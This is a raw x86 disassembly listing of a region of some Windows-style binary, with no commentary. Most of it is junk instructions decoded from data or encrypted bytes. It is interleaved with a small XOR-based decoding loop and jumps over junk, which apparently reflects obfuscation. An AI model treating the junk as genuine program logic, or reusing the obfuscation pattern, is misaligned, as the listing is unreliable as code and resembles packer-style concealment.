  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x2c02235c]
  40736c:	fadd   QWORD PTR [edx]
  40736e:	loope  0x407379
  407370:	iret   
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x40732b
  407378:	fwait
  407379:	test   DWORD PTR [ebp+0x3fb4d8ea],esi
  40737f:	mov    WORD PTR [edx+0x3cbf0c5a],ds
  407385:	add    eax,0xde161c73
  40738a:	dec    ecx
  40738b:	(bad)  
  40738c:	add    BYTE PTR [edx-0x54],al
  40738f:	jp     0x407403
  407391:	in     eax,0xf7
  407393:	jmp    0xb322:0x99c46a44
  40739a:	and    DWORD PTR [edi+eiz*2],ebp
  40739d:	repnz inc esp
  40739f:	jp     0x4073ee
  4073a1:	popa   
  4073a2:	test   DWORD PTR [edi+eiz*8+0x53],ecx
  4073a6:	or     al,0x75
  4073a8:	call   0x90c1:0xd3f6914b
  4073af:	iret   
  4073b0:	loopne 0x4073f7
  4073b2:	or     ah,bl
  4073b4:	dec    ebp
  4073b5:	or     DWORD PTR [esi+ecx*4-0x9baaf2],esp
  4073bc:	psrlq  mm7,QWORD PTR [ebx+0x56]
  4073c0:	bound  ebx,QWORD PTR [eax+esi*8-0x53]
  4073c4:	inc    esi
  4073c5:	push   edx
  4073c6:	adc    DWORD PTR [eax],eax
  4073c8:	xchg   ebp,eax
  4073c9:	div    BYTE PTR [esi]
  4073cb:	xor    ecx,edx
  4073cd:	sub    cl,BYTE PTR [edi]
  4073cf:	into   
  4073d0:	outs   dx,BYTE PTR ds:[esi]
  4073d1:	fwait
  4073d2:	rcr    DWORD PTR [edi+0x6fdf3448],1
  4073d8:	ret    
  4073d9:	or     DWORD PTR [edi-0x64],esi
  4073dc:	mov    DWORD PTR [eax],esp
  4073de:	popf   
  4073df:	mov    bl,0x77
  4073e1:	push   ecx
  4073e2:	mov    cl,0x6f
  4073e4:	out    0x6c,al
  4073e6:	dec    esp
  4073e7:	addr16 mov esi,0xecd59c53
  4073ed:	cdq    
  4073ee:	scas   eax,DWORD PTR es:[edi]
  4073ef:	push   ebx
  4073f0:	xchg   BYTE PTR [edi+0x4b444eb6],bh
  4073f6:	icebp  
  4073f7:	dec    ebp
  4073f8:	dec    eax
  4073f9:	fucomi st,st(1)
  4073fb:	cdq    
  4073fc:	adc    BYTE PTR [eax-0x282db3f3],al
  407402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407404:	fld    DWORD PTR [ebx]
  407406:	sub    BYTE PTR [ebx-0x609ea4db],bh
  40740c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740d:	pop    eax
  40740e:	pop    ss
  40740f:	mov    esp,0x68f30ce4
  407414:	test   eax,0xc730d0e3
  407419:	imul   ecx,esi,0xffffff96
  40741c:	xchg   esp,eax
  40741d:	inc    edi
  40741e:	mov    eax,ds:0x969099f
  407423:	mov    eax,ds:0x2cebc511
  407428:	fwait
  407429:	rcl    ah,1
  40742b:	(bad)  
  40742c:	in     al,0x8
  40742e:	inc    ebp
  40742f:	je     0x4073e5
  407431:	push   ebp
  407432:	jmp    0xe44b:0xb3c6dc92
  407439:	add    cl,BYTE PTR [esi]
  40743b:	shr    DWORD PTR [ecx-0x17154edd],cl
  407441:	xchg   esp,eax
  407442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407443:	and    BYTE PTR [ecx+0x57],ch
  407446:	add    ebp,esp
  407448:	inc    eax
  407449:	cmp    al,0xf8
  40744b:	pop    esi
  40744c:	jne    0x40749a
  40744e:	and    eax,0x61596af0
  407453:	pop    edi
  407454:	sahf   
  407455:	add    al,0xd1
  407457:	imul   esp,DWORD PTR [edi+ebx*4+0x48c7ff6c],0xffffff88
  40745f:	push   ss
  407460:	dec    esp
  407461:	mov    ebp,0x8c0df7dd
  407466:	jne    0x40740f
  407468:	cmp    eax,0xd4058188
  40746d:	addr16 inc ecx
  40746f:	sbb    eax,0x592cfaa5
  407474:	pusha  
  407475:	jnp    0x407471
  407477:	jbe    0x4074bd
  407479:	cmp    eax,0x42a903ed
  40747e:	fist   DWORD PTR [edi+0x73c1c17]
  407484:	ss hlt 
  407486:	mov    edi,0xb63e849
  40748b:	push   esp
  40748c:	dec    ebx
  40748d:	fdiv   QWORD PTR [ebp+ecx*1-0x1be0adc9]
  407494:	cld    
  407495:	sub    ecx,esi
  407497:	add    ax,0x7c52
  40749b:	xor    BYTE PTR ds:[ebx-0x4d617746],0x4e
  4074a3:	xchg   esi,eax
  4074a4:	add    BYTE PTR [ebx],0x79
  4074a7:	adc    eax,0xaa2b9f21
  4074ac:	sub    al,0xe4
  4074ae:	xchg   ebx,eax
  4074af:	ds mov esi,0x570b6d68
  4074b5:	mov    bh,ah
  4074b7:	push   esi
  4074b8:	jmp    0x4074e4
  4074ba:	xlat   BYTE PTR ds:[ebx]
  4074bb:	pop    esi
  4074bc:	in     al,dx
  4074bd:	icebp  
  4074be:	adc    dl,dh
  4074c0:	(bad)  
  4074c1:	ja     0x407509
  4074c3:	pop    esi
  4074c4:	ds js  0x407454
  4074c7:	push   cs
  4074c8:	stos   DWORD PTR es:[edi],eax
  4074c9:	mov    dh,0xcc
  4074cb:	and    al,0xce
  4074cd:	enter  0x60e4,0x90
  4074d1:	and    DWORD PTR [edi+eax*1+0x6e161641],edx
  4074d8:	cmc    
  4074d9:	call   0x4138f8bc
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	push   ds
  40750a:	fwait
  40750b:	lea    esp,[edi-0x13]
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x40757a
  407516:	jp     0x407585
  407518:	(bad)  
  407519:	pop    ds
  40751a:	xchg   ebp,eax
  40751b:	int3   
  40751c:	bound  ecx,QWORD PTR [ebx]
  40751e:	or     al,0x13
  407520:	and    eax,0xb3c6b480
  407525:	sub    DWORD PTR [esi+0x1],0xd8104b7f
  40752c:	std    
  40752d:	jge    0x407539
  40752f:	sahf   
  407530:	pop    es
  407531:	adc    BYTE PTR [ebx+edi*2],dh
  407534:	and    BYTE PTR [eax],0x94
  407537:	in     eax,0x17
  407539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40753a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40753b:	in     eax,dx
  40753c:	loop   0x40754f
  40753e:	inc    eax
  40753f:	and    eax,0x2ca47f6b
  407544:	cmp    al,0xaf
  407546:	push   ss
  407547:	test   BYTE PTR ds:0x62c84638,0x6b
  40754e:	stc    
  40754f:	pop    es
  407550:	xor    DWORD PTR [edi+0x265492b8],ebp
  407556:	mov    dl,0x47
  407558:	mov    edx,0x23604807
  40755d:	mov    ds:0x6f8caff,eax
  407562:	jo     0x407581
  407564:	sbb    BYTE PTR [edi+0x3ce76b9d],al
  40756a:	xchg   BYTE PTR es:[ebp-0x2736de74],dh
  407571:	scas   eax,DWORD PTR es:[edi]
  407572:	daa    
  407573:	dec    ebp
  407575:	pop    edx
  407576:	mov    cl,0xdf
  407578:	hlt    
  407579:	fimul  WORD PTR [ebp+0x6f49967e]
  40757f:	sbb    BYTE PTR [ebx],ah
  407581:	push   ecx
  407582:	in     al,dx
  407583:	jnp    0x40751b
  407585:	adc    eax,0xfc3413f2
  40758a:	arpl   WORD PTR [edi-0x3d274a76],dx
  407590:	add    DWORD PTR [edi],esi
  407592:	dec    ebp
  407593:	pop    ds
  407594:	mov    eax,0x121c9b6b
  407599:	es clc 
  40759b:	or     ebx,DWORD PTR [eax+0xac8010c]
  4075a1:	in     al,0x35
  4075a3:	popf   
  4075a4:	jecxz  0x407583
  4075a6:	fst    DWORD PTR [edi]
  4075a8:	cmc    
  4075a9:	xor    DWORD PTR [edx+0x3d87d0c1],0xffffffdd
  4075b0:	call   0xedab:0x25d03b77
  4075b7:	push   eax
  4075b8:	rcr    BYTE PTR [edx],0x57
  4075bb:	fstp   TBYTE PTR [ebx-0x240fb46e]
  4075c1:	mov    ebx,0xbed22584
  4075c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c7:	das    
  4075c8:	fadd   st(0),st
  4075ca:	mov    edx,0xe94306ca
  4075cf:	mov    eax,0xdac3d1bb
  4075d4:	or     BYTE PTR fs:0xc7bf4bc8,0x6
  4075dc:	add    esp,esp
  4075de:	mov    edx,0x73517b45
  4075e3:	jg     0x40761f
  4075e5:	mov    edx,0x5c907c03
  4075ea:	stos   DWORD PTR es:[edi],eax
  4075eb:	xlat   BYTE PTR ds:[ebx]
  4075ec:	(bad)  
  4075ed:	xor    DWORD PTR [ecx],edi
  4075ef:	jp     0x407579
  4075f1:	repnz popf 
  4075f3:	ja     0x40757f
  4075f5:	clc    
  4075f6:	int    0x7b
  4075f8:	dec    cx
  4075fa:	cmp    DWORD PTR [esi],esp
  4075fc:	push   ecx
  4075fd:	retf   0xde69
  407600:	push   es
  407601:	xchg   edx,eax
  407602:	imul   eax,DWORD PTR [edx],0xbc03f90a
  407608:	out    dx,eax
  407609:	xor    DWORD PTR [edi-0x2f],ebp
  40760c:	ins    DWORD PTR es:[edi],dx
  40760d:	adc    BYTE PTR [edi+0x11],bh
  407610:	iret   
  407611:	jp     0x4075d8
  407613:	pop    DWORD PTR [esi]
  407615:	xor    ecx,esp
  407617:	push   0x8
  407619:	in     eax,0xc8
  40761b:	fist   WORD PTR [eax]
  40761d:	pop    esp
  40761e:	jecxz  0x407644
  407620:	sbb    BYTE PTR ds:0x892558f9,al
  407626:	xchg   edi,eax
  407627:	and    BYTE PTR [esi],ah
  407629:	pop    ds
  40762a:	nop
  40762b:	add    dh,BYTE PTR [ecx-0x5b]
  40762e:	(bad)  
  40762f:	ja     0x40763f
  407631:	out    0x49,eax
  407633:	and    edx,DWORD PTR [edx-0x60]
  407636:	mov    ebp,0x52e8c585
  40763b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40763c:	nop
  40763d:	mov    ch,0x26
  40763f:	jb     0x40762b
  407641:	dec    ecx
  407642:	scas   eax,DWORD PTR es:[edi]
  407643:	repnz cmp esp,DWORD PTR [edx+0x42]
  407647:	cmp    bh,0x40
  40764a:	inc    ecx
  40764b:	call   0x3b35:0x2df8b7ec
  407652:	into   
  407653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407654:	adc    BYTE PTR [ebp+0x1e],al
  407657:	dec    edi
  407658:	mov    ah,0x38
  40765a:	sahf   
  40765b:	je     0x407688
  40765d:	and    BYTE PTR [ebx+0x6ca3be21],al
  407663:	nop
  407664:	cli    
  407665:	call   0xf2e5:0x22b6e9be
  40766c:	into   
  40766d:	imul   ebx,DWORD PTR ds:0x5431767b,0xe9093235
  407677:	in     al,dx
  407678:	int    0x8b
  40767a:	jge    0x407684
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	sub    DWORD PTR [ecx+0x53],ecx
  407690:	pop    es
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407681
  40769a:	sub    esi,edi
  40769c:	mov    al,0x7d
  40769e:	rcl    DWORD PTR [ebx-0x4c],0x9e
  4076a2:	jns    0x4076f2
  4076a4:	jb     0x407688
  4076a6:	cmp    BYTE PTR ds:0xd3b68aa9,cl
  4076ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076ad:	inc    ebp
  4076ae:	adc    DWORD PTR [edi+0x2a],0x7a
  4076b2:	lea    esp,[esi+edx*1+0x3294cc31]
  4076b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076ba:	or     eax,0xbbef0bee
  4076bf:	jns    0x407641
  4076c1:	mov    eax,ds:0xfd6c4c2
  4076c6:	ret    
  4076c7:	shr    eax,0xe3
  4076ca:	jae    0x407687
  4076cc:	inc    ebx
  4076cd:	pcmpeqd mm3,mm3
  4076d0:	cmp    BYTE PTR [ecx-0x4a],dl
  4076d3:	sbb    al,0xb
  4076d5:	std    
  4076d6:	into   
  4076d7:	pop    esp
  4076d8:	xchg   esp,eax
  4076d9:	xor    DWORD PTR [edi-0x29fb57bf],esp
  4076df:	jae    0x4076ea
  4076e1:	jo     0x407685
  4076e3:	(bad)  
  4076e4:	adc    DWORD PTR ds:0x85b6f7c1,eax
  4076ea:	push   esi
  4076eb:	or     ah,ch
  4076ed:	call   0x1380:0x7bb0a5b6
  4076f4:	test   eax,0xf7b4129
  4076f9:	mov    DWORD PTR [ebx-0x247f85e2],ecx
  4076ff:	pop    es
  407700:	and    BYTE PTR [eax+edi*8-0x547274df],0x61
  407708:	into   
  407709:	pushf  
  40770a:	sti    
  40770b:	je     0x407753
  40770d:	in     al,dx
  40770e:	and    DWORD PTR [ebx+0x2b],edi
  407711:	sahf   
  407712:	leave  
  407713:	xchg   esp,eax
  407714:	and    BYTE PTR [ecx-0x3f],0x46
  407718:	lahf   
  407719:	xor    eax,0xe1784620
  40771e:	mov    ebx,0x20c13507
  407723:	in     al,dx
  407724:	and    eax,0x8ceeb0f2
  407729:	xor    BYTE PTR [ecx+0x59c732c3],ch
  40772f:	adc    eax,0x9b32a1aa
  407734:	sbb    eax,0x41bd44fb
  407739:	repz or BYTE PTR [ecx],cl
  40773c:	test   al,0x80
  40773e:	sub    BYTE PTR [eax+0x323e5a8a],ah
  407744:	lods   eax,DWORD PTR ds:[esi]
  407745:	(bad)  
  407746:	mov    bl,ch
  407748:	addr16 lahf 
  40774a:	pop    esi
  40774b:	retf   
  40774c:	xchg   esp,eax
  40774d:	(bad)  
  40774e:	icebp  
  40774f:	push   0x621bc945
  407754:	lock js 0x407733
  407757:	lea    esp,ss:[ecx+0x66cfff79]
  40775e:	into   
  40775f:	push   esi
  407760:	fsqrt  
  407762:	mov    dh,0x61
  407764:	mov    ebx,0x4672d513
  407769:	jnp    0x407735
  40776b:	repnz sub ah,bh
  40776e:	cmp    BYTE PTR [esi],0xfb
  407771:	sub    BYTE PTR [ecx],cl
  407773:	mov    al,0x46
  407775:	jnp    0x40774a
  407777:	sbb    edx,DWORD PTR [edi+0x58e7f3a9]
  40777d:	mov    ecx,0x26027ff7
  407782:	adc    ebx,DWORD PTR [ebx+0xaca2da2]
  407788:	cld    
  407789:	mul    BYTE PTR [ebx+0x63]
  40778c:	push   DWORD PTR [ebx+0x50]
  40778f:	lods   eax,DWORD PTR ds:[esi]
  407790:	mov    dl,0x44
  407792:	dec    edi
  407793:	les    esp,FWORD PTR [ebx+0x3054962f]
  407799:	push   0x44
  40779b:	pop    ebx
  40779c:	jo     0x407795
  40779e:	pushf  
  40779f:	mov    ch,0x76
  4077a1:	push   es
  4077a2:	(bad)  
  4077a3:	cli    
  4077a4:	ins    BYTE PTR es:[edi],dx
  4077a5:	pop    ds
  4077a6:	ins    BYTE PTR es:[edi],dx
  4077a7:	cmp    ebx,DWORD PTR [edi+ebp*1+0x23efeda4]
  4077ae:	add    esp,edx
  4077b0:	fdivrp st(6),st
  4077b2:	xchg   edx,eax
  4077b3:	icebp  
  4077b4:	int3   
  4077b5:	data16 sbb al,0xd1
  4077b8:	jmp    0x40780d
  4077ba:	test   DWORD PTR [esp+esi*4],ebx
  4077bd:	dec    edx
  4077be:	or     cl,BYTE PTR [edi+0x32]
  4077c1:	xor    al,0xcc
  4077c3:	icebp  
  4077c4:	mov    bl,0x12
  4077c6:	jns    0x407792
  4077c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c9:	sbb    eax,0x53092667
  4077ce:	imul   ebp,DWORD PTR [ebp-0x31],0xffffffd4
  4077d2:	rol    edi,1
  4077d4:	add    al,0x59
  4077d6:	iret   
  4077d7:	xchg   ebp,eax
  4077d8:	jb     0x4077ae
  4077da:	jl     0x4077bb
  4077dc:	pop    ebx
  4077dd:	mov    bl,0x6f
  4077df:	and    al,0xe6
  4077e1:	inc    BYTE PTR [esi-0x71]
  4077e4:	pop    edx
  4077e5:	sar    BYTE PTR [edi],0xc4
  4077e8:	inc    eax
  4077e9:	xor    eax,0xde40b553
  4077ee:	jle    0x40783a
  4077f0:	retf   
  4077f1:	mov    ebx,0x306ec518
  4077f6:	jo     0x407800
  4077f8:	inc    edx
  4077f9:	mov    al,gs:0x40b87c02
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	or     ch,ah
  407822:	xor    al,0x5f
  407824:	and    eax,0xd27e7ec3
  407829:	jg     0x4078a9
  40782b:	jle    0x407837
  40782d:	push   ss
  40782e:	daa    
  40782f:	sub    BYTE PTR [edi],ah
  407831:	cmp    BYTE PTR [ebx+0x6b36c08d],al
  407837:	lods   al,BYTE PTR ds:[esi]
  407838:	aam    0x74
  40783a:	fistp  QWORD PTR [edx-0x2e3142bd]
  407840:	mov    dl,BYTE PTR [edi]
  407842:	int    0x1c
  407844:	sub    BYTE PTR [eax],ah
  407846:	mov    edi,0xed40132e
  40784b:	test   BYTE PTR [eax-0x54],bh
  40784e:	sub    eax,0xa012c92e
  407853:	lahf   
  407854:	fstp   QWORD PTR [ecx-0x16]
  407857:	div    BYTE PTR [edx]
  407859:	mov    gs,ecx
  40785b:	sbb    ch,BYTE PTR [ecx-0x75]
  40785e:	adc    DWORD PTR [edi-0x5b],ebx
  407861:	inc    esi
  407862:	inc    edx
  407863:	inc    edi
  407864:	aam    0xd1
  407866:	out    dx,eax
  407867:	mov    DWORD PTR [eax],ebx
  407869:	dec    eax
  40786a:	sahf   
  40786b:	and    ah,bh
  40786d:	fimul  WORD PTR [ecx-0x30]
  407870:	adc    eax,0xfd03c0b7
  407875:	int3   
  407876:	mov    ds:0x9e054920,eax
  40787b:	mov    ds,edx
  40787d:	sti    
  40787e:	retf   
  40787f:	mov    ds:0x5120cd9a,al
  407884:	xchg   edx,eax
  407885:	aad    0x60
  407887:	lock stos BYTE PTR es:[edi],al
  407889:	jno    0x4078a0
  40788b:	int    0xf9
  40788d:	iret   
  40788e:	jo     0x407843
  407890:	stc    
  407891:	xchg   BYTE PTR [edx+0x5e],bh
  407894:	inc    eax
  407895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407896:	xor    esi,DWORD PTR [eax+0x60b72a38]
  40789c:	mov    BYTE PTR [edx-0xe],dh
  40789f:	mov    esp,0x8922021c
  4078a4:	add    esi,edx
  4078a6:	fist   DWORD PTR [ecx]
  4078a8:	jns    0x4078ed
  4078aa:	xor    ecx,DWORD PTR [edx-0x4d]
  4078ad:	in     al,dx
  4078ae:	dec    edx
  4078af:	and    al,0xde
  4078b1:	dec    edi
  4078b2:	sbb    DWORD PTR [eax-0x2acc6d6],edx
  4078b8:	fidivr WORD PTR [esi-0x20]
  4078bb:	mov    ecx,esi
  4078bd:	loope  0x407918
  4078bf:	ror    DWORD PTR [ecx],1
  4078c1:	pop    esi
  4078c2:	div    DWORD PTR [esi-0x3cd22972]
  4078c8:	xor    al,0xfd
  4078ca:	nop
  4078cb:	adc    dh,BYTE PTR [edi-0x3df2397a]
  4078d1:	mov    esi,0x68f9a3a6
  4078d6:	push   ebp
  4078d7:	mov    ah,0x98
  4078d9:	jne    0x407878
  4078db:	xchg   DWORD PTR [eax],edi
  4078dd:	(bad)  
  4078de:	in     al,0x1d
  4078e0:	mov    ebp,0xa319044f
  4078e5:	sbb    BYTE PTR [ebp-0xe9f9f57],0x5d
  4078ec:	jg     0x407922
  4078ee:	popa   
  4078ef:	and    ebx,DWORD PTR [eax-0x6e102928]
  4078f5:	sub    esi,DWORD PTR [edi-0x5b]
  4078f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f9:	addr16 imul ebx,DWORD PTR [bp+si],0x1b
  4078fe:	pusha  
  4078ff:	xchg   edx,eax
  407900:	mov    ds:0xa719d49f,al
  407905:	mov    ah,0xc5
  407907:	rcr    ecx,0xe
  40790a:	xchg   ebx,eax
  40790b:	xchg   ebp,eax
  40790c:	or     BYTE PTR [ebp+0x7796c01b],cl
  407912:	adc    edx,DWORD PTR [edx+0x67]
  407915:	or     ecx,DWORD PTR [eax+ecx*2+0x609e8ebc]
  40791c:	mov    cs:0xee2ad95b,eax
  407922:	in     eax,dx
  407923:	or     eax,0x2f0c3a7b
  407929:	xchg   ecx,eax
  40792a:	dec    ebp
  40792b:	push   0x825c2f1d
  407930:	push   ebx
  407931:	data16 or BYTE PTR [ebx],bl
  407934:	cmp    cl,dh
  407936:	pmullw mm1,QWORD PTR [edi+0x15800f4d]
  40793d:	pop    eax
  40793e:	xchg   esi,eax
  40793f:	cmp    esi,edx
  407941:	mov    WORD PTR [esi+0x58],es
  407944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407945:	daa    
  407946:	aaa    
  407947:	rcl    ah,1
  407949:	loopne 0x407919
  40794b:	add    eax,0x2eb962f
  407950:	fadd   QWORD PTR [edx-0x45bf50e0]
  407956:	out    dx,eax
  407957:	popf   
  407958:	arpl   WORD PTR [esi+0x4e2d4626],ax
  40795e:	scas   al,BYTE PTR es:[edi]
  40795f:	retf   0x9e49
  407962:	add    bl,BYTE PTR [eax+0x19]
  407965:	xchg   esp,eax
  407966:	mov    ah,0x9d
  407968:	cmp    eax,ebp
  40796a:	pop    es
  40796b:	push   edx
  40796c:	subps  xmm3,XMMWORD PTR [ecx+0x592a7806]
  407973:	mov    edx,0x104485d2
  407978:	mov    ch,BYTE PTR [eax-0x5b98033a]
  40797e:	xchg   esp,eax
  40797f:	push   ds
  407980:	push   ds
  407981:	and    al,0xf6
  407983:	shl    DWORD PTR [ecx+edi*1-0x54e33e63],1
  40798a:	out    0x5,eax
  40798c:	mov    ecx,0xfe1b221
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	xor    BYTE PTR [edx+0x34],0x9d
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x4079d3
  4079b4:	in     al,dx
  4079b5:	jmp    0x40795b
  4079b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b8:	outs   dx,DWORD PTR ds:[esi]
  4079b9:	jge    0x4079f9
  4079bb:	in     al,0xf3
  4079bd:	mov    edi,0x269f17d5
  4079c2:	mul    DWORD PTR [ecx-0x56dfbe19]
  4079c8:	push   ds
  4079c9:	inc    edi
  4079ca:	push   esp
  4079cb:	jne    0x40799d
  4079cd:	loop   0x407994
  4079cf:	in     al,0x8e
  4079d1:	mov    DWORD PTR [edi+0xf],ebp
  4079d4:	pop    ss
  4079d5:	jns    0x407a07
  4079d7:	leave  
  4079d8:	and    ah,bh
  4079da:	cmc    
  4079db:	sub    eax,DWORD PTR [ecx]
  4079dd:	gs fs sub eax,0x42810a64
  4079e4:	adc    edi,DWORD PTR [edi-0x1edf60b]
  4079ea:	std    
  4079eb:	retf   0x6d80
  4079ee:	and    bh,BYTE PTR [eax]
  4079f0:	dec    eax
  4079f1:	jmp    0x4079c6
  4079f3:	mov    ebp,0xca831153
  4079f8:	(bad)  
  4079f9:	das    
  4079fa:	lods   al,BYTE PTR ds:[esi]
  4079fb:	call   0xf739:0xadc5f0a6
  407a02:	cmp    BYTE PTR [edi],dl
  407a04:	jg     0x407a14
  407a06:	inc    ebx
  407a07:	dec    ebp
  407a08:	jnp    0x407a56
  407a0a:	mov    dh,0xac
  407a0c:	jmp    0x407a72
  407a0e:	mov    al,ds:0x2a661d7f
  407a13:	cwde   
  407a14:	nop
  407a15:	or     ebx,DWORD PTR [eax+0x6c]
  407a18:	fmul   st,st(3)
  407a1a:	sub    bh,ch
  407a1c:	and    al,0xc0
  407a1e:	mov    bh,0x19
  407a20:	sbb    ebp,edi
  407a22:	mov    ah,0xf9
  407a24:	jns    0x4079f9
  407a26:	xor    ecx,esi
  407a28:	scas   eax,DWORD PTR es:[edi]
  407a29:	aaa    
  407a2a:	cli    
  407a2b:	fimul  WORD PTR [edx-0x7e]
  407a2e:	data16 (bad) [esi+0x74972450]
  407a35:	xor    al,0x14
  407a37:	aam    0x97
  407a39:	cmp    DWORD PTR [ebx-0x70c2beb0],ebx
  407a3f:	xor    edi,DWORD PTR [eax+0x4b]
  407a42:	cmp    eax,0xd5badd7e
  407a47:	enter  0x6278,0xb9
  407a4b:	xor    ch,BYTE PTR [ebp+0x5]
  407a4e:	xor    eax,0xb46dadad
  407a53:	ins    DWORD PTR es:[edi],dx
  407a54:	xchg   bh,dh
  407a56:	sub    BYTE PTR ss:[ecx-0x13],al
  407a5a:	mov    ebx,0x39ab49e7
  407a5f:	dec    ebp
  407a60:	mov    esp,0x3990fc8a
  407a65:	or     bl,BYTE PTR [ebx-0x32]
  407a68:	test   edx,0xe5e44ec8
  407a6e:	pop    eax
  407a6f:	push   cs
  407a70:	cwde   
  407a71:	push   ebx
  407a72:	jmp    0x407a7c
  407a74:	inc    edx
  407a75:	rcl    DWORD PTR [ecx+0x60],1
  407a78:	dec    edi
  407a79:	dec    edx
  407a7a:	pusha  
  407a7b:	jmp    0x73d74a66
  407a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a81:	vandps xmm3,xmm6,XMMWORD PTR [ebp+0x41]
  407a86:	pop    esi
  407a87:	adc    DWORD PTR [ecx],edx
  407a89:	aad    0x24
  407a8b:	shl    WORD PTR [ebx-0x6366cc65],cl
  407a92:	xchg   ecx,eax
  407a93:	(bad)  
  407a94:	and    ecx,DWORD PTR [edx+0x36]
  407a97:	xchg   edi,eax
  407a98:	out    0x9c,al
  407a9a:	mov    esp,0x48285b26
  407a9f:	fst    QWORD PTR [edi+0x2b]
  407aa2:	or     bl,BYTE PTR [edx+0x42]
  407aa5:	nop
  407aa6:	xor    DWORD PTR [edi-0x3f],edi
  407aa9:	or     DWORD PTR [esp+ebp*4+0xb665766],0xffffff82
  407ab1:	lock xchg ecx,eax
  407ab3:	jp     0x407abc
  407ab5:	bound  edx,QWORD PTR [ebx-0x42]
  407ab8:	ror    esi,1
  407aba:	ja     0x407b1c
  407abc:	sub    al,0x77
  407abe:	pop    eax
  407abf:	retf   0x9163
  407ac2:	jge    0x407ade
  407ac4:	(bad)  
  407ac5:	cmc    
  407ac6:	mov    edx,0x438eb8a6
  407acb:	mov    ds:0x2ff0bced,al
  407ad0:	std    
  407ad1:	out    dx,eax
  407ad2:	push   eax
  407ad3:	xchg   DWORD PTR [esi],ebx
  407ad5:	add    al,0x3
  407ad7:	pop    edi
  407ad9:	xchg   BYTE PTR [ebx-0x78ef7d9f],bh
  407adf:	ret    
  407ae0:	push   edx
  407ae1:	in     al,0x44
  407ae3:	bound  edi,QWORD PTR cs:[edx+eiz*2-0x2a0ba8ed]
  407aeb:	jle    0x407b2d
  407aed:	cmc    
  407aee:	inc    ebx
  407aef:	mov    esp,cs
  407af1:	mov    esp,0x6108fd15
  407af6:	push   0xe4eb057
  407afb:	jnp    0x407b15
  407afd:	popa   
  407afe:	cld    
  407aff:	and    al,BYTE PTR [ebp+0x696424c6]
  407b05:	xchg   ecx,eax
  407b06:	cmp    eax,ecx
  407b08:	fst    DWORD PTR [edi+edx*1+0x5b]
  407b0c:	jecxz  0x407b6b
  407b0e:	out    dx,al
  407b0f:	dec    esi
  407b10:	adc    eax,0x5d2466c6
  407b15:	and    al,0x78
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	mov    al,0x0
  407b4d:	mov    es,WORD PTR [edi]
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407b62
  407b58:	pop    DWORD PTR [ebx]
